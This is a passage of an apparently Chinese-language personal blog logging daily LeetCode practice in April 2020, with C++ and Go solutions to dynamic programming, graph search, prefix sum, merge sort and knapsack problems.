class="keyword">if</span>(j!=<span class="number">0</span>)</span><br><span class="line">                dp[i][j][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j][<span class="number">1</span>],dp[i<span class="number">-1</span>][j<span class="number">-1</span>][<span class="number">0</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=dp[len][<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=K;i++)&#123;</span><br><span class="line">        ans=<span class="built_in">max</span>(ans,dp[len][i][<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="leetcode-309-最佳买卖股票时机含冷冻期-C"><a href="#leetcode-309-最佳买卖股票时机含冷冻期-C" class="headerlink" title="leetcode 309. 最佳买卖股票时机含冷冻期_C++"></a>leetcode 309. 最佳买卖股票时机含冷冻期_C++</h5><p>可以看到对K没有限制，又可以降维了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 309. 最佳买卖股票时机含冷冻期</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[n+<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>]=-inf;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>][<span class="number">1</span>]=-prices[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i<span class="number">-1</span>]);</span><br><span class="line">        dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-2</span>][<span class="number">0</span>]-prices[i<span class="number">-1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="leetcode-714-买卖股票的最佳时机含手续费-C"><a href="#leetcode-714-买卖股票的最佳时机含手续费-C" class="headerlink" title="leetcode 714. 买卖股票的最佳时机含手续费_C++"></a>leetcode 714. 买卖股票的最佳时机含手续费_C++</h5><p>easy，改改我们的参数就好了</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 714. 买卖股票的最佳时机含手续费</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices, <span class="keyword">int</span> fee)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n=prices.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> inf = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[n+<span class="number">1</span>][<span class="number">2</span>];</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>]=-inf;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">0</span>],dp[i<span class="number">-1</span>][<span class="number">1</span>]+prices[i<span class="number">-1</span>]);</span><br><span class="line">        dp[i][<span class="number">1</span>]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][<span class="number">1</span>],dp[i<span class="number">-1</span>][<span class="number">0</span>]-prices[i<span class="number">-1</span>]-fee);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="leetcode-200-岛屿数量-Go"><a href="#leetcode-200-岛屿数量-Go" class="headerlink" title="leetcode 200. 岛屿数量_Go"></a>leetcode 200. 岛屿数量_Go</h4><p>一开始用的BFS，提交之后发现很慢，for嵌套的太多了，就用DFS又写了一次，快了些</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BFS</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numIslands</span><span class="params">(grid [][]<span class="keyword">byte</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	wayX := []<span class="keyword">int</span>&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">-1</span>&#125;</span><br><span class="line">	wayY := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">-1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">	row := <span class="built_in">len</span>(grid)</span><br><span class="line">	<span class="keyword">if</span> row == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	col := <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">	num := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> grid[i][j] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">				grid[i][j] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">				num++</span><br><span class="line">				queue := [][]<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;i, j&#125;)</span><br><span class="line">				<span class="keyword">for</span> <span class="built_in">len</span>(queue) != <span class="number">0</span> &#123;</span><br><span class="line">					top := queue[<span class="number">0</span>]</span><br><span class="line">					queue = queue[<span class="number">1</span>:]</span><br><span class="line">					x, y := top[<span class="number">0</span>], top[<span class="number">1</span>]</span><br><span class="line">					<span class="keyword">for</span> z := <span class="number">0</span>; z &lt; <span class="number">4</span>; z++ &#123;</span><br><span class="line">						newX := x + wayX[z]</span><br><span class="line">						newY := y + wayY[z]</span><br><span class="line">						<span class="keyword">if</span> newX &gt;= <span class="number">0</span> &amp;&amp; newX &lt; row &amp;&amp; newY &gt;= <span class="number">0</span> &amp;&amp; newY &lt; col &amp;&amp; grid[newX][newY] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">							grid[newX][newY] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">							queue = <span class="built_in">append</span>(queue, []<span class="keyword">int</span>&#123;newX, newY&#125;)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DFS</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numIslands2</span><span class="params">(grid [][]<span class="keyword">byte</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	row := <span class="built_in">len</span>(grid)</span><br><span class="line">	<span class="keyword">if</span> row == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	col := <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">	num := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; row; i++ &#123;</span><br><span class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; col; j++ &#123;</span><br><span class="line">			<span class="keyword">if</span> grid[i][j] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">				num++</span><br><span class="line">				dfs(grid, i, j)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(grid [][]<span class="keyword">byte</span>, r <span class="keyword">int</span>, c <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">	nr := <span class="built_in">len</span>(grid)</span><br><span class="line">	nc := <span class="built_in">len</span>(grid[<span class="number">0</span>])</span><br><span class="line">	grid[r][c] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">	<span class="keyword">if</span> r<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[r<span class="number">-1</span>][c] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">		dfs(grid, r<span class="number">-1</span>, c)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> r+<span class="number">1</span> &lt; nr &amp;&amp; grid[r+<span class="number">1</span>][c] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">		dfs(grid, r+<span class="number">1</span>, c)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c<span class="number">-1</span> &gt;= <span class="number">0</span> &amp;&amp; grid[r][c<span class="number">-1</span>] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">		dfs(grid, r, c<span class="number">-1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> c+<span class="number">1</span> &lt; nc &amp;&amp; grid[r][c+<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span> &#123;</span><br><span class="line">		dfs(grid, r, c+<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	grid := [][]<span class="keyword">byte</span>&#123;</span><br><span class="line">		&#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>&#125;,</span><br><span class="line">		&#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>&#125;&#125;</span><br><span class="line">	ans := numIslands2(grid)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>并查集暂时不看了，有些遗忘，而且总觉得使用率不高</p>
<h3 id="2020-4-21"><a href="#2020-4-21" class="headerlink" title="2020/4/21"></a>2020/4/21</h3><h4 id="leetcode-1248-统计优美子数组-Go"><a href="#leetcode-1248-统计优美子数组-Go" class="headerlink" title="leetcode 1248. 统计优美子数组_Go"></a>leetcode 1248. 统计优美子数组_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 奇数为1, 偶数为0, 子区间和为k的种类数</span></span><br><span class="line"><span class="comment">// 前缀和</span></span><br><span class="line"><span class="comment">// 有多少个sum-k，就有多少个k</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numberOfSubarrays</span><span class="params">(nums []<span class="keyword">int</span>, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; length; i++ &#123;</span><br><span class="line">		<span class="keyword">if</span> nums[i]&amp;<span class="number">1</span> == <span class="number">1</span> &#123;</span><br><span class="line">			nums[i] = <span class="number">1</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			nums[i] = <span class="number">0</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	mp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">	sum, ans := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">	mp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= length; i++ &#123;</span><br><span class="line">		sum += nums[i<span class="number">-1</span>]</span><br><span class="line">		x := sum - k</span><br><span class="line">		ans += mp[x]</span><br><span class="line">		mp[sum]++</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>&#125;</span><br><span class="line">	fmt.Println(numberOfSubarrays(nums, <span class="number">2</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-22"><a href="#2020-4-22" class="headerlink" title="2020/4/22"></a>2020/4/22</h3><h4 id="leetcode-199-二叉树的右视图-Go"><a href="#leetcode-199-二叉树的右视图-Go" class="headerlink" title="leetcode 199. 二叉树的右视图_Go"></a>leetcode 199. 二叉树的右视图_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TreeNode struct</span></span><br><span class="line"><span class="keyword">type</span> TreeNode <span class="keyword">struct</span> &#123;</span><br><span class="line">	Val   <span class="keyword">int</span></span><br><span class="line">	Left  *TreeNode</span><br><span class="line">	Right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newNode</span><span class="params">(val <span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;TreeNode&#123;</span><br><span class="line">		Val:   val,</span><br><span class="line">		Left:  <span class="literal">nil</span>,</span><br><span class="line">		Right: <span class="literal">nil</span>,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">creatTree</span><span class="params">(a []<span class="keyword">int</span>)</span> *<span class="title">TreeNode</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(a)</span><br><span class="line">	<span class="keyword">if</span> length == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	node := newNode(a[<span class="number">0</span>])</span><br><span class="line">	queue := []*TreeNode&#123;&#125;</span><br><span class="line">	queue = <span class="built_in">append</span>(queue, node)</span><br><span class="line">	num := <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> num &lt; length &#123;</span><br><span class="line">		top := queue[<span class="number">0</span>]</span><br><span class="line">		queue = queue[<span class="number">1</span>:]</span><br><span class="line">		<span class="keyword">if</span> top.Left == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> a[num] != <span class="number">-1</span> &#123;</span><br><span class="line">				top.Left = newNode(a[num])</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Left)</span><br><span class="line">			&#125;</span><br><span class="line">			num++</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> num == length &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> top.Right == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> a[num] != <span class="number">-1</span> &#123;</span><br><span class="line">				top.Right = newNode(a[num])</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Right)</span><br><span class="line">			&#125;</span><br><span class="line">			num++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> node</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 层序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">rightSideView</span><span class="params">(root *TreeNode)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ans := []<span class="keyword">int</span>&#123;&#125;</span><br><span class="line">	queue := []*TreeNode&#123;&#125;</span><br><span class="line">	queue = <span class="built_in">append</span>(queue, root)</span><br><span class="line">	<span class="keyword">for</span> <span class="built_in">len</span>(queue) != <span class="number">0</span> &#123;</span><br><span class="line">		size := <span class="built_in">len</span>(queue)</span><br><span class="line">		ans = <span class="built_in">append</span>(ans, queue[<span class="number">0</span>].Val)</span><br><span class="line">		<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; size; i++ &#123;</span><br><span class="line">			top := queue[<span class="number">0</span>]</span><br><span class="line">			queue = queue[<span class="number">1</span>:]</span><br><span class="line">			<span class="keyword">if</span> top.Right != <span class="literal">nil</span> &#123;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Right)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> top.Left != <span class="literal">nil</span> &#123;</span><br><span class="line">				queue = <span class="built_in">append</span>(queue, top.Left)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	input := []<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">-1</span>, <span class="number">5</span>, <span class="number">-1</span>, <span class="number">4</span>&#125;</span><br><span class="line">	root := creatTree(input)</span><br><span class="line">	<span class="comment">//fmt.Println(root)</span></span><br><span class="line">	ans := rightSideView(root)</span><br><span class="line">	fmt.Println(ans)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-23"><a href="#2020-4-23" class="headerlink" title="2020/4/23"></a>2020/4/23</h3><h4 id="leetcode-面试题-08-11-硬币-Go"><a href="#leetcode-面试题-08-11-硬币-Go" class="headerlink" title="leetcode 面试题 08.11. 硬币_Go"></a>leetcode 面试题 08.11. 硬币_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暴力数学算法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waysToChange</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	mod := <span class="keyword">int</span>(math.Pow10(<span class="number">9</span>)) + <span class="number">7</span></span><br><span class="line">	ans := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt;= n/<span class="number">25</span>; i++ &#123;</span><br><span class="line">		x := n - i*<span class="number">25</span></span><br><span class="line">		y := x/<span class="number">5</span> + <span class="number">1</span></span><br><span class="line">		z := x/<span class="number">10</span> + <span class="number">1</span></span><br><span class="line">		ans += (y - z + <span class="number">1</span>) * z</span><br><span class="line">		ans %= mod</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(waysToChange(<span class="number">5</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-24"><a href="#2020-4-24" class="headerlink" title="2020/4/24"></a>2020/4/24</h3><h4 id="leetcode-面试题51-数组中的逆序对-Go"><a href="#leetcode-面试题51-数组中的逆序对-Go" class="headerlink" title="leetcode 面试题51. 数组中的逆序对_Go"></a>leetcode 面试题51. 数组中的逆序对_Go</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一反应双循环，但必定超时</span></span><br><span class="line"><span class="comment">// 归并排序</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">reversePairs</span><span class="params">(nums []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	length := <span class="built_in">len</span>(nums)</span><br><span class="line">	<span class="keyword">if</span> length &lt; <span class="number">2</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	newNums := <span class="built_in">make</span>([]<span class="keyword">int</span>, length)</span><br><span class="line">	temp := <span class="built_in">make</span>([]<span class="keyword">int</span>, length)</span><br><span class="line">	<span class="built_in">copy</span>(newNums, nums)</span><br><span class="line">	<span class="keyword">return</span> mergeSort(newNums, <span class="number">0</span>, length<span class="number">-1</span>, temp)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mergeSort</span><span class="params">(newNums []<span class="keyword">int</span>, left <span class="keyword">int</span>, right <span class="keyword">int</span>, temp []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> right == left &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	&#125;</span><br><span class="line">	mid := left + (right-left)/<span class="number">2</span></span><br><span class="line">	leftPairs := mergeSort(newNums, left, mid, temp)</span><br><span class="line">	rightPairs := mergeSort(newNums, mid+<span class="number">1</span>, right, temp)</span><br><span class="line">	<span class="keyword">if</span> newNums[mid] &lt;= newNums[mid+<span class="number">1</span>] &#123;</span><br><span class="line">		<span class="keyword">return</span> leftPairs + rightPairs</span><br><span class="line">	&#125;</span><br><span class="line">	cross := crossPairs(newNums, left, mid, right, temp)</span><br><span class="line">	<span class="keyword">return</span> cross + leftPairs + rightPairs</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">crossPairs</span><span class="params">(newNums []<span class="keyword">int</span>, left <span class="keyword">int</span>, mid <span class="keyword">int</span>, right <span class="keyword">int</span>, temp []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> i := left; i &lt;= right; i++ &#123;</span><br><span class="line">		temp[i] = newNums[i]</span><br><span class="line">	&#125;</span><br><span class="line">	i, j := left, mid+<span class="number">1</span></span><br><span class="line">	count := <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> k := left; k &lt;= right; k++ &#123;</span><br><span class="line">		<span class="keyword">if</span> i == mid+<span class="number">1</span> &#123;</span><br><span class="line">			newNums[k] = temp[j]</span><br><span class="line">			j++</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> j == right+<span class="number">1</span> &#123;</span><br><span class="line">			newNums[k] = temp[i]</span><br><span class="line">			i++</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> temp[i] &lt;= temp[j] &#123;</span><br><span class="line">			newNums[k] = temp[i]</span><br><span class="line">			i++</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			newNums[k] = temp[j]</span><br><span class="line">			j++</span><br><span class="line">			count += (mid - i + <span class="number">1</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	nums := []<span class="keyword">int</span>&#123;<span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">4</span>&#125;</span><br><span class="line">	fmt.Println(reversePairs(nums))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2020-4-25-amp-amp-26"><a href="#2020-4-25-amp-amp-26" class="headerlink" title="2020/4/25 &amp;&amp; 26"></a>2020/4/25 &amp;&amp; 26</h3><h4 id="背包九讲-C"><a href="#背包九讲-C" class="headerlink" title="背包九讲_C++"></a>背包九讲_C++</h4><p>题目来自ACWing</p>
<h5 id="0-1背包问题"><a href="#0-1背包问题" class="headerlink" title="0/1背包问题"></a>0/1背包问题</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">// ACWing 0/1 package</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> n=<span class="number">1010</span>;</span><br><span class="line"><span class="keyword">int</span> N,V;</span><br><span class="line"><span class="keyword">int</span> v[n]; <span class="comment">// volume</span></span><br><span class="line"><span class="keyword">int</span> w[n]; <span class="comment">// weight</span></span><br><span class="line"><span class="keyword">int</span> f[n][n];</span><br><span class="line"><span class="keyword">int</span> F[n];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基础二维状态</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    f[i][j] 根据前i件物品，且手头背包空间为j的时候，做出的最优选择</span></span><br><span class="line"><span class="comment">    1.若不选择第i件物品 f[i][j]=f[i-1][j]</span></span><br><span class="line"><span class="comment">    2.若选择了第i件物品 f[i][j]=f[i-1][j-v[i]]+w[i]</span></span><br><span class="line"><span class="comment">    f[i][j]=max&#123;1,2&#125;</span></span><br><span class="line"><span class="comment">    边界：</span></span><br><span class="line"><span class="comment">    f[0][j]=0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">basicTwo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;N,&amp;V);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=V;j++)&#123;</span><br><span class="line">            f[i][j]=f[i<span class="number">-1</span>][j];</span><br><span class="line">            <span class="keyword">if</span>(j&gt;=v[i])&#123;</span><br><span class="line">                f[i][j]=<span class="built_in">max</span>(f[i][j],f[i<span class="number">-1</span>][j-v[i]]+w[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span 